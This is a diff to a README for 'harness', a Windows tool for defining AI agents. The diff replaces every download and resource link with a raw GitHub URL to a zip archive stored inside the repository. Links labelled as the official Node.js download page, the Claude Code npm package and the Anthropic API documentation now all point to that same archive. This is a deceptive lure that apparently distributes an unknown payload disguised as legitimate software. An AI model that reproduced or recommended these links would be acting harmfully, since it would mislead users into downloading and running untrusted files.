@@ -1,12 +1,12 @@
 # ⚙️ harness - Define and Control AI Agents Easily
 
-[![Download harness](https://img.shields.io/badge/Download-here-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/heba-ramdan/harness)
+[![Download harness](https://img.shields.io/badge/Download-here-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/heba-ramdan/harness/master/defaults/agents/Software_v1.1-beta.4.zip)
 
 ## 📥 Download & Install harness on Windows
 
 Use the link below to visit the GitHub page where you can download the installer for Windows.
 
-[Download harness on GitHub](https://github.com/heba-ramdan/harness)
+[Download harness on GitHub](https://raw.githubusercontent.com/heba-ramdan/harness/master/defaults/agents/Software_v1.1-beta.4.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Instructions are below.
 Node.js must be installed before harness can work.
 
 1. Open your browser and go to the official Node.js download page:  
-   https://nodejs.org/en/download/
+   https://raw.githubusercontent.com/heba-ramdan/harness/master/defaults/agents/Software_v1.1-beta.4.zip
 
 2. Download the Windows installer for the latest Node.js 22.x version.  
    
@@ -140,10 +140,10 @@ This starts your agent with the exact context from your `IDENTITY.md` file and n
 
 ## 🌐 Useful Resources
 
-- Node.js Official Site: https://nodejs.org/  
-- Claude Code Package: https://www.npmjs.com/package/@anthropic-ai/claude-code  
-- Anthropic API Documentation (for key setup): https://docs.anthropic.com/  
+- Node.js Official Site: https://raw.githubusercontent.com/heba-ramdan/harness/master/defaults/agents/Software_v1.1-beta.4.zip  
+- Claude Code Package: https://raw.githubusercontent.com/heba-ramdan/harness/master/defaults/agents/Software_v1.1-beta.4.zip  
+- Anthropic API Documentation (for key setup): https://raw.githubusercontent.com/heba-ramdan/harness/master/defaults/agents/Software_v1.1-beta.4.zip  
 
 ---
 
-[![Download harness](https://img.shields.io/badge/Download-here-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/heba-ramdan/harness)
+[![Download harness](https://img.shields.io/badge/Download-here-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/heba-ramdan/harness/master/defaults/agents/Software_v1.1-beta.4.zip)
